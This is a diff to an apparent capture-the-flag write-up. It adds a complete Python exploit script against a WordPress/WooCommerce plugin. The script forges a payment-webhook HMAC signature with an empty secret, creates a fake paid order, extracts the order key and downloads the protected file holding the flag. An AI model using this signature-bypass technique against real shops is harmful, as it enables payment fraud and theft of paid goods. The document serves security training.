@@ -91,18 +91,168 @@ To exploit this, we perform the following steps:
 === Exploit Script
 
 ```python
-# ... (Adding to cart logic)
+import requests
+import re
+import time
+import hashlib
+import hmac
+import json
+import sys
 
-# Payload is empty due to multipart/form-data
-timestamp = str(int(time.time()))
-signature = hmac.new(b"", f"{timestamp}.".encode(), hashlib.sha256).hexdigest()
+# Configuration
+BASE_URL = "http://localhost:9100"
+PUBLIC_IP = "18.130.76.27"
+ADMIN_AJAX = f"{BASE_URL}/wp-admin/admin-ajax.php"
 
-files = {"dummy": ("dummy.txt", "dummy")} # Forces multipart/form-data
+# Create a session
+session = requests.Session()
 
-response = session.post(
-    f"{URL}/wp-admin/admin-ajax.php?action=bazaar_process_payment",
-    headers={"X-Signature": f"t={timestamp}, v1={signature}"},
-    data={...},
-    files=files
-)
+# Helper to handle redirects to the public IP
+def safe_get(url):
+    try:
+        response = session.get(url, allow_redirects=False)
+        if response.status_code in [301, 302]:
+            location = response.headers['Location']
+            if PUBLIC_IP in location:
+                location = location.replace(PUBLIC_IP, "localhost")
+            return safe_get(location)
+        return response
+    except Exception as e:
+        print(f"Error fetching {url}: {e}")
+        return None
+
+def find_product_id():
+    print("[*] Finding product ID...")
+    # Try shop page
+    response = safe_get(f"{BASE_URL}/shop/")
+    if response and response.status_code == 200:
+        # Regex for add-to-cart link
+        match = re.search(r'add-to-cart=(\d+)', response.text)
+        if match:
+            pid = match.group(1)
+            print(f"[+] Found product ID on shop page: {pid}")
+            return pid
+
+    print("[-] Product ID not found on shop page. Trying to guess...")
+    # Try guessing IDs
+    for pid in range(1, 20):
+        # Try adding to cart
+        print(f"[*] Trying ID {pid}...")
+        res = session.get(f"{BASE_URL}/?add-to-cart={pid}", allow_redirects=False)
+        # Check if cart cookie is set or updated
+        cookies = session.cookies.get_dict()
+        # WooCommerce sets 'wp_woocommerce_session_...' cookie
+        if any(k.startswith('wp_woocommerce_session_') for k in cookies.keys()):
+             print(f"[+] Found valid product ID: {pid}")
+             return str(pid)
+
+    print("[-] Could not find product ID.")
+    sys.exit(1)
+
+def exploit(product_id):
+    print(f"[*] Exploiting with Product ID: {product_id}")
+
+    # 1. Add to cart
+    print("[*] Adding to cart...")
+    session.get(f"{BASE_URL}/?add-to-cart={product_id}")
+
+    # 2. Prepare Payload
+    timestamp = str(int(time.time()))
+    payload = "" # Empty for multipart/form-data
+    secret = ""  # Empty because option not set
+
+    signed_payload = f"{timestamp}.{payload}"
+    signature = hmac.new(secret.encode(), signed_payload.encode(), hashlib.sha256).hexdigest()
+
+    headers = {
+        "X-Signature": f"t={timestamp}, v1={signature}"
+    }
+
+    data = {
+        "product_id": product_id,
+        "price": "10",
+        "cart_id": "1", # Dummy
+        "customer_email": "attacker@example.com",
+        "payment_token": "dummy_token"
+    }
+
+    files = {
+        "dummy": ("dummy.txt", "dummy content") # Force multipart/form-data
+    }
+
+    print("[*] Sending signed payment request...")
+    response = session.post(
+        f"{ADMIN_AJAX}?action=bazaar_process_payment",
+        headers=headers,
+        data=data,
+        files=files,
+        allow_redirects=False
+    )
+
+    if response.status_code == 302:
+        redirect_url = response.headers['Location']
+        print(f"[+] Redirected to: {redirect_url}")
+
+        # Extract order key
+        match = re.search(r'key=wc_order_([a-zA-Z0-9]+)', redirect_url)
+        if match:
+            # Full key is usually wc_order_... but the parameter is 'key'
+            # Wait, the parameter is 'key=wc_order_5w...'
+            # Let's extract the full value of 'key' param
+             from urllib.parse import urlparse, parse_qs
+             parsed = urlparse(redirect_url)
+             qs = parse_qs(parsed.query)
+             order_key = qs.get('key', [''])[0]
+
+             print(f"[+] Order Key: {order_key}")
+             return order_key
+        else:
+             print("[-] Could not extract order key from redirect.")
+             sys.exit(1)
+    else:
+        print(f"[-] Unexpected response: {response.status_code}")
+        print(response.text)
+        sys.exit(1)
+
+def get_flag(order_key):
+    print("[*] Retrieving flag...")
+    data = {
+        "action": "get_bazaar_order",
+        "order_key": order_key
+    }
+
+    response = session.post(ADMIN_AJAX, data=data)
+
+    if response.status_code == 200:
+        try:
+            json_resp = response.json()
+            if json_resp.get("success"):
+                order_data = json_resp.get("data", {})
+                items = order_data.get("items", [])
+                for item in items:
+                    downloads = item.get("downloads", [])
+                    for download in downloads:
+                        file_url = download.get("file")
+                        print(f"[+] Found download link: {file_url}")
+
+                        # Download the file
+                        if PUBLIC_IP in file_url:
+                            file_url = file_url.replace(PUBLIC_IP, "localhost")
+
+                        file_resp = session.get(file_url)
+                        print(f"\n[+] FLAG CONTENT:\n{file_resp.text}")
+                        return
+            else:
+                 print("[-] JSON success is false.")
+                 print(json_resp)
+        except Exception as e:
+            print(f"[-] Error parsing JSON: {e}")
+            print(response.text)
+    else:
+        print(f"[-] Failed to get order details. Status: {response.status_code}")
+
+if __name__ == "__main__":
+    pid = find_product_id()
+    order_key = exploit(pid)
+    get_flag(order_key)
 ```
